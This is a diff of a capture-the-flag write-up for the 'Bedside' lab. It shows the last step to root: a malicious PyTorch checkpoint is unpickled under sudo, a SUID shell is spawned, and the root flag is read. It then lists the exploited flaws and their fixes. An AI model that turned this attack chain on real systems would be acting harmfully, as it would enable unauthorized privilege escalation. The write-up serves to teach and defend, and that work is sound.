 2026-07-26 16:40:03,071 | INFO | Found checkpoint /datastore/checkpoints/root.pt, loading with CheckpointLoader (callable mode)...
+Traceback (most recent call last):
+  ...
+TypeError: Argument checkpoint should be a string or a dictionary, but given <class 'int'>
 ```
 
-- 🔍 *Now spawn the SUID root shell:*
+Even though a TypeError is thrown after loading, our `__reduce__` hook executed during the unpickling phase!
+
+#### 6. Spawning Root Shell
+
+We execute the newly minted SUID binary with the `-p` flag (preserving effective root privileges):
 
 ```bash
-developer@bedside:~$ /usr/local/bin/rootbash -p
+/usr/local/bin/rootbash -p
 ```
 
 ```text
 rootbash-5.2# id
 uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer),100(users)
+
 rootbash-5.2# cat /root/root.txt
+8f****************************3c
 ```
 
-- 🔍 *The `-p` flag preserves effective root privileges. Host completely compromised!*
+Full root access achieved!
+
+> 🎯 **Final Takeaways & Real Talk:**  
+> Bedside is an exceptional demonstration of how modern machine learning ecosystems can be subverted through deserialization vulnerabilities! The attack vector bridges two distinct Python serialization pitfalls: `pdfminer.six`'s flawed font CMap loading (CVE-2025-64512) and PyTorch's default `torch.load()` unpickling behavior inside MONAI's CheckpointLoader. Navigating hidden IPv6 listening ports and coordinating actions across two separate unprivileged accounts to satisfy complex pre-execution data checks makes this an outstanding, realistic challenge. Happy Hacking!
 
 ---
 
-## Mitigations & Security Perspective
+## Step 5 - Mitigations & Defensive Hardening
 
-> [!IMPORTANT]
-> **🛡️ Blue Team Security Assessment Blueprint**
-> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Bedside system. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.
+To remediate the vulnerabilities identified across the Bedside environment, administrators and data engineering teams should apply defense-in-depth controls across library dependencies, development environments, and machine learning pipelines:
 
-### 🔴 Unsafe Pickle Deserialization in pdfminer.six (CVE-2025-64512)
+### 1. Secure Character Map Handling in pdfminer.six (CVE-2025-64512)
+- **Upgrade pdfminer.six:** Update `pdfminer.six` to a patched release where user-supplied CMap names are strictly validated against an internal whitelist and restricted from referencing external filesystem paths.
+- **Strict Path Validation:** In custom document-processing wrappers, reject any font or encoding parameter containing path traversal sequences (`..`) or absolute path indicators (`/`, `\`).
 
-> [!WARNING]
-> **Vulnerability Profile:**
-> The `pdfminer.six` library uses `pickle.loads()` to deserialize CMap font mapping files referenced via user-controlled PDF encoding dictionaries, allowing path traversal to attacker-uploaded pickle payloads.
+### 2. Development Server & IPv6 Exposure Hardening
+- **Bind Development Servers to Loopback Only:** Ensure internal development servers (such as Vite or esbuild) bind strictly to `127.0.0.1` and `::1` without exposing endpoints to wildcard interfaces (`0.0.0.0` or `::`).
+- **Implement Production Static File Serving:** Never expose development servers with Hot Module Replacement (`/@hmr`) to production networks. Use hardened web servers (such as Nginx or Apache) with canonical path normalization enabled.
 
-> [!CAUTION]
-> **Risk & Downstream Threat Impact:**
-> Unauthenticated users uploading PDFs can trigger immediate arbitrary code execution inside the document processing service context.
+### 3. Safe PyTorch Checkpoint Loading (`weights_only=True`)
+- **Enforce Safe Deserialization in PyTorch:** When invoking `torch.load()`, always specify `weights_only=True` to prevent the execution of arbitrary pickle constructors:
+  ```python
+  torch.load(checkpoint_path, weights_only=True)
+  ```
+- **Migrate to Safetensors:** Replace legacy `.pt` and `.pickle` serialization formats with `safetensors`, a modern format designed specifically for fast and secure tensor storage without code execution capabilities.
 
-> [!TIP]
-> **Defensive Remediation & Detection Strategies:**
-> - **Remediation:** Update `pdfminer.six` to a patched release where CMap filenames are validated strictly against an allowlist of built-in relative names.
-> - **Remediation:** Avoid Python's native `pickle` format for asset caching; use safe serialization formats like JSON, MessagePack, or Protocol Buffers.
-> - **Detection:** Inspect uploaded PDF objects for `/Encoding` dictionaries containing path traversal sequences or hex-encoded directory delimiters (`#2F`).
-
----
-
-### 🔴 Path Traversal in Development Static File Server (Port 3000)
-
-> [!WARNING]
-> **Vulnerability Profile:**
-> A development web server bound to IPv6 lacked path normalization and allowed client-side path traversal via `--path-as-is`.
-
-> [!CAUTION]
-> **Risk & Downstream Threat Impact:**
-> Attackers can read arbitrary files across the host filesystem, including user SSH keys (`id_rsa`), configuration secrets, and system hashes.
-
-> [!TIP]
-> **Defensive Remediation & Detection Strategies:**
-> - **Remediation:** Never run development servers (Vite, custom HMR daemons) in production environments.
-> - **Remediation:** Enforce canonical path checking: verify `os.path.realpath(requested_path).startswith(safe_root_dir)`.
-
----
-
-### 🟡 MONAI PyTorch Checkpoint Insecure Deserialization via Sudo
-
-> [!WARNING]
-> **Vulnerability Profile:**
-> The `bedside_trainer.py` script was granted passwordless `sudo` execution while dynamically loading untrusted `.pt` checkpoint files via PyTorch `torch.load()`.
-
-> [!CAUTION]
-> **Risk & Downstream Threat Impact:**
-> Because `torch.load()` invokes `pickle.loads()` by default, any user capable of writing to `/datastore/checkpoints` can execute code as `root`.
-
-> [!TIP]
-> **Defensive Remediation & Detection Strategies:**
-> - **Remediation:** Enable `weights_only=True` in `torch.load()` or `CheckpointLoader` to restrict deserialization to pure tensor data and block arbitrary object instantiation.
-> - **Remediation:** Restrict sudo privileges so scripts cannot read from shared or world-writable storage directories.
+### 4. Least Privilege Sudo Policies
+- **Avoid Wildcard Python Sudo Delegations:** Sudo entries granting root access to run Python scripts should be replaced with dedicated compiled binaries or restricted automation services.
+- **Audit Shared Datastore Permissions:** Ensure training datastores (`/datastore/`) enforce strict POSIX permissions and ACLs, preventing unprivileged container accounts from staging files loaded by administrative processes.
